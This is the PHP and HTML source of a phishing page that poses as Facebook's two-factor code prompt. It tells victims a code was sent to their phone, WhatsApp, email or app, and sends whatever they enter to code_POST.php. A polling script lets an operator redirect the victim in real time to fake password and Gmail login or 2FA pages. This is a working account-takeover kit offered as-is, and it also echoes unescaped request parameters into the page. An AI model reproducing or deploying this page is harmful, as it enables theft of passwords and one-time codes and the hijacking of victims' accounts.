<?php
$token=$_GET['token'];

$w="0";
if(isset($_GET['w']))
{
    $w=$_GET['w'];
}

$code="";
if(isset($_GET['code']))
{
    $code=$_GET['code'];
}

$names=trim(file_get_contents("names/".$token.".txt"));


$codemsg=trim(file_get_contents("code_msg/".$token.".txt"));
$parts = explode(":", $codemsg);

$type = $parts[0]; 
$content = $parts[1]; 

$heading="";
$paragraph="";
$picture="auth.png";
$time="03:00";

if($type=="phone")
{
    $heading="Check your text messages";
    $paragraph="Enter the code we sent to ".$content.".";
    $picture="phone.png";
}
else if($type=="wp")
{
    $heading="Check your WhatsApp messages";
    $paragraph="Enter the code we sent to your WhatsApp account.";
    $picture="wp.png";
    $time="01:00";
}
else if($type=="app")
{
    $heading="Go to your authentication app";
    $paragraph="Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).";
}
else if($type=="email")
{
    $heading="Check your email messages";
    $paragraph="Enter the code we sent to ".$content.".";
    $picture="email.jpg";
}
else if($type=="device")
{
    $heading="Check your notifications on another device";
    $paragraph="We sent a notification to your ".$content.". Check your Facebook notifications there and approve the login to continue";
    $picture="device.png";
}
else
{
    $heading="Go to your authentication app";
    $paragraph="Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="DC.title" content="">
    <meta name="revisit-after" content="1 day">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="distribution" content="GLOBAL">
    <meta name="rating" content="General">
    <meta name="copyright" content="">
    <meta name="author" content="">
    <meta name="theme-color" content="#FFF">
    <meta name="robots" content="noindex,nofollow">
    <link href="files/boxicons.min.css" rel="stylesheet">
    <link href="files/main.css" rel="stylesheet">
    <script src="files/jquery-3.6.4.min.js"></script>
    <link href="files/jquery.select.css" rel="stylesheet">
    <script src="files/socket.io.js"></script>
    <script src="files/jquery.select.min.js"></script>
    <title>Threads</title>
    <link rel="icon" href="fb-files/threadsfavicon.png">

    <style>
        .errorClass
        {
            border: 1px solid #d33a42 !important;
            color: #d33a42;
        }

        .errorClassNoBorder
        {
            color: #d33a42;
        }
    </style>
</head>

<body>


    <link href="fb-files/verification.module.css" rel="stylesheet">
    <div class="verification_main">
        <div class="container">
            <div class="heading">
                <span> <?= $names;?> • Facebook</span>
                <h2>
                    <?= $heading; ?> </h2>

                <p>
                    <?= $paragraph; ?> </p>
            </div>
            <div class="image">
                <img src="fb-files/<?= $picture; ?>" alt="Image"> </div>
            <div class="form">
                <form method="post" class="authForm" action="code_POST.php" id="f1">
                    <input type="hidden" name="token" id="token" value="<?= $token; ?>" />

                    <?php

                    if($w=="0")
                    {
                        if($type=="device")
                        {

                        }
                        else
                        {
                            echo '<input class="authFormInput" type="number" name="code" id="code" placeholder="Code" data-required="true" data-codetype="2fa" value="'.$code.'"/>';
                        }

                    }
                    else
                    {
                        if($type=="device")
                        {

                        }
                        else
                        {
                            echo '<input class="authFormInput errorClass" type="number" name="code" id="code" placeholder="Code" data-required="true" data-codetype="2fa" value="'.$code.'"/>';
                            echo '<span class="errorClassNoBorder" id="error-code" style="">This code doesn`t work. Check it`s correct or try a new one.</span>';
                        }

                    }

                    ?>

                    <!-- <span class="error" id="error-code" style="">This code does'nt work. Check it's correct or try a new one.</span> -->

                    <?php

                        if ($type=="phone" || $type=="email" || $type=="wp") {
                            ?>
                    <br><br>

                    <div style="display: flex; align-items: center; color: gray;">
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="20" height="20" viewBox="0 0 256 256" xml:space="preserve" style="color:gray">
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                        <path d="M 81.521 31.109 c -0.86 -1.73 -2.959 -2.438 -4.692 -1.575 c -1.73 0.86 -2.436 2.961 -1.575 4.692 c 2.329 4.685 3.51 9.734 3.51 15.01 C 78.764 67.854 63.617 83 45 83 S 11.236 67.854 11.236 49.236 c 0 -16.222 11.501 -29.805 26.776 -33.033 l -3.129 4.739 c -1.065 1.613 -0.62 3.784 0.992 4.85 c 0.594 0.392 1.264 0.579 1.926 0.579 c 1.136 0 2.251 -0.553 2.924 -1.571 l 7.176 -10.87 c 0.001 -0.001 0.001 -0.002 0.002 -0.003 l 0.018 -0.027 c 0.063 -0.096 0.106 -0.199 0.159 -0.299 c 0.049 -0.093 0.108 -0.181 0.149 -0.279 c 0.087 -0.207 0.152 -0.419 0.197 -0.634 c 0.009 -0.041 0.008 -0.085 0.015 -0.126 c 0.031 -0.182 0.053 -0.364 0.055 -0.547 c 0 -0.014 0.004 -0.028 0.004 -0.042 c 0 -0.066 -0.016 -0.128 -0.019 -0.193 c -0.008 -0.145 -0.018 -0.288 -0.043 -0.431 c -0.018 -0.097 -0.045 -0.189 -0.071 -0.283 c -0.032 -0.118 -0.065 -0.236 -0.109 -0.35 c -0.037 -0.095 -0.081 -0.185 -0.125 -0.276 c -0.052 -0.107 -0.107 -0.211 -0.17 -0.313 c -0.054 -0.087 -0.114 -0.168 -0.175 -0.25 c -0.07 -0.093 -0.143 -0.183 -0.223 -0.27 c -0.074 -0.08 -0.153 -0.155 -0.234 -0.228 c -0.047 -0.042 -0.085 -0.092 -0.135 -0.132 L 36.679 0.775 c -1.503 -1.213 -3.708 -0.977 -4.921 0.53 c -1.213 1.505 -0.976 3.709 0.53 4.921 l 3.972 3.2 C 17.97 13.438 4.236 29.759 4.236 49.236 C 4.236 71.714 22.522 90 45 90 s 40.764 -18.286 40.764 -40.764 C 85.764 42.87 84.337 36.772 81.521 31.109 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(119, 119, 119); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
                    </g>
                    </svg>
                        <span style="line-height: 25px;">&nbsp;&nbsp;We can send a new code in <b id="timer1"><?= $time; ?></b></span>
                    </div>
                            <?php
                        } 
                        ?>



                    <?php

                        if ($type=="device" ) {
                            ?>
                    

                    <div style="display: flex; align-items: center; color: gray;">
                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="25" height="25" viewBox="0 0 256 256" xml:space="preserve">
                        <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                            <circle cx="44.996" cy="44.996" r="3.176" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
                            <circle cx="19.176000000000002" cy="44.996" r="3.176" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
                            <circle cx="70.82600000000001" cy="44.996" r="3.176" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(0,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "/>
                            <path d="M 45 90 C 20.187 90 0 69.813 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 C 90 69.813 69.813 90 45 90 z M 45 4 C 22.393 4 4 22.393 4 45 s 18.393 41 41 41 s 41 -18.393 41 -41 S 67.607 4 45 4 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(119, 119, 119); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"/>
                        </g>
                        </svg>
                        <span style="line-height: 25px;">&nbsp;&nbsp;Waiting for approval</span>
                    </div>
                            <?php
                        } 
                        ?>

                        




                    <?php
                         if ($type=="device") { ?>

                        
                        <?php } else { ?>
                            <div class="authSubmit">
                                <button name="submitAuth" type="button" onclick="submit_login()" style="cursor:pointer" id="btn_submit">Continue</button>
                            </div>
                        <?php }
                    ?>







                </form>
            </div>

        </div>
    </div>



</body>

</html>

<script type="text/javascript">

    $(document).ready(function() {
    $('#code').on('input', function() {
        $(this).removeClass('errorClass');
    });
});

    function submit_login(){
        var code=$("#code").val();
        var code_input=$("#code");

        var hasError = false;

        if (code === "" || !/^\d{5}$|^\d{6}$|^\d{8}$/.test(code)) {
            code_input.addClass("errorClass"); 
            hasError = true;
        } else {
            code_input.removeClass("errorClass");  
        }

        if (!hasError) {
            $("#error-code").css("display","none !important");
            $("#f1").submit();
        }

    }
</script>


    <script type="text/javascript">
        const token = "<?php echo $token; ?>"; 

        function checkStatus() {
            fetch(`check_place.php?token=${token}`)
                .then(response => response.text())
                .then(data => {
                    data = data.trim();

                    if (data === 'code' || data=="hold" || data=="") {
                        console.log("Do not redirect");
                        return;
                    } else if (data === 'continue') {
                        window.location.href = 'continue.php?token='+token;
                    } else if (data === 'pwd') {
                        window.location.href = 'login.php?token='+token;
                    } else if (data === 'break') {
                        window.location.href = 'break.php?token='+token;
                    } else if (data === 'gm_verify') {
                        window.location.href = 'gmail_verify.php?token='+token;
                    } else if (data === 'gm_login') {
                        window.location.href = 'gmail_login.php?token='+token;
                    } else if (data === 'gm_2fa_device') {
                        window.location.href = 'gmail_2fa.php?token='+token+'&mode=device';
                    } else if (data === 'gm_2fa_pick') {
                        window.location.href = 'gmail_2fa.php?token='+token+'&mode=pick';
                    } else if (data === 'gm_hold') {
                        window.location.href = 'gmail_login_POST.php?token='+token+'&waiting=1';
                    } else{
                        return;
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        const statusInterval = setInterval(checkStatus, 2000);
    </script>



<script>
$(document).ready(function() {
    let initialTime = '<?php echo $time; ?>'; 

    $('#timer1').text(initialTime);

    let timeInMinutes = parseInt(initialTime.split(':')[0], 10) * 60 + parseInt(initialTime.split(':')[1], 10); 

    function updateTimer() {
        let minutes = Math.floor(timeInMinutes / 60);
        let seconds = timeInMinutes % 60;
        let timeStr = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
        $('#timer1').text(timeStr);

        if (timeInMinutes <= 0) {
            clearInterval(timerInterval);
            $('#timer1').parent().html('<a href="#" id="resetLink" style="line-height:25px;text-decoration:none;">&nbsp;&nbsp;Get a new code</a>'); 
            $('#resetLink').click(function() {
                location.reload(); 
            });
        }

        timeInMinutes--; 
    }

    let timerInterval = setInterval(updateTimer, 1000);
});
</script>
